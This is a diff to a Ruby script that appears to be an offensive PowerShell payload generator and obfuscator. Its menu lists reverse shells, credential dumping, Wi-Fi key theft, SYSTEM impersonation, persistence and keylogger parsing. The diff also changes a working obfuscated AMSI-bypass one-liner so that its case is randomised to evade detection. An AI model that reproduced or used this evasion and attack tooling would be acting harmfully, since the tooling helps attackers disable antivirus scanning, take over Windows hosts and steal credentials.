@@ -324,7 +324,7 @@ def listPayloads()
   puts "Invoke-PowerShellTcp        Shells              Send a reverse shell via TCP to a port of an ip".light_blue
   puts "Invoke-PowerShellTcpOneLine Shells              Send a reverse shell via TCP to a port of an ip (simplified)".light_blue
   puts "Invoke-PowerShellUdp        Shells              Send a reverse shell via UDP to a port of an ip".light_blue
-  puts "Invoke-ConPtyShell          Shells              Send an interactive ConPty shell to a port of an ip".light_blue
+  puts "Get-System                  Privesc             Try to impersonate NT AUTHORITY/SYSTEM account"
   puts "Get-Information             Gather              Get some basic information about the system".light_blue
   puts "Get-WLAN-Keys               Gather              Display Wifi information and its stored credentials".light_blue
   puts "Get-PassHashes              Gather              Dump system credentials from registry hives".light_blue
@@ -337,7 +337,7 @@ def listPayloads()
   puts "Remove-Update               Escalation          Remove previous updates from system stealthily".light_blue
   puts "Add-Persistence             Utility             Execute a payload on every computer reboot persistently".light_blue
   puts "Download                    Utility             Download given file to user temp directory".light_blue
-  puts "Parse_Keys                  Utility             ".light_blue
+  puts "Parse_Keys                  Utility             Parse keys logged by Nishang keylogger".light_blue
   puts "Invoke-AmsiBypass           Bypassing           Bypass AMSI with a dynamic one-liner command".light_blue
 
   exit(0)
@@ -394,7 +394,8 @@ def getPayload(payload)
   elsif payload == "Parse_Keys"
     res = HTTParty.get(base_url + "Utility/Parse_Keys.ps1")
   elsif payload == "Invoke-AmsiBypass"
-    template = "[ReF].\"`A$(echo sse)`mB$(echo L)`Y\".\"g`E$(echo tty)p`E\"(( \"Sy{3}ana{1}ut{4}ti{2}{0}ils\" -f'iUt','gement.A',\"on.Am`s\",'stem.M','oma') ).\"$(echo ge)`Tf`i$(echo El)D\"((\"{0}{2}ni{1}iled\" -f'am','tFa',\"`siI\"),(\"{2}ubl{0}`,{1}{0}\" -f 'ic','Stat','NonP')).\"$(echo Se)t`Va$(echo LUE)\"($(),$(1 -eq 1))"
+    template = "[ReF].\"`A$(" + randCase("echo sse") + ")`mB$(" + randCase("echo L") + ")`Y\".\"g`E$(" + randCase("echo tty") + ")p`E\"(( \"Sy{3}ana{1}ut{4}ti{2}{0}ils\" -f'iUt','gement.A',\"on.Am`s\",'stem.M','oma') ).\"$(" + randCase("echo ge") + ")`Tf`i$(" + randCase("echo El") + ")D\"((\"{0}{2}ni{1}iled\" -f'am','tFa',\"`siI\"),(\"{2}ubl{0}`,{1}{0}\" -f 'ic','Stat','NonP')).\"$(" + randCase("echo Se") + ")t`Va$(" + randCase("echo LUE") + ")\"($(),$(1 -eq 1))"
+
     return template
   else
     puts "\n[!] Invalid payload".red
@@ -610,10 +611,6 @@ def obfuscate(file_data)
       modedfunc = cmdletObfs(func)
       file_data.gsub!(/#{func}/i, modedfunc)
 
-      if func == "Write-Warning"
-        binding.pry
-      end
-
       if $verbose && $first_iter
         puts("  " + func + " --> " + modedfunc)
       end
@@ -810,6 +807,7 @@ def main()
 
     if opts[:payload] == "Invoke-AmsiBypass"
       writeContent(file_data, opts[:output])
+      puts "[+] Obfuscated script written to #{opts[:output]}".green
       exit 0
     end
   end
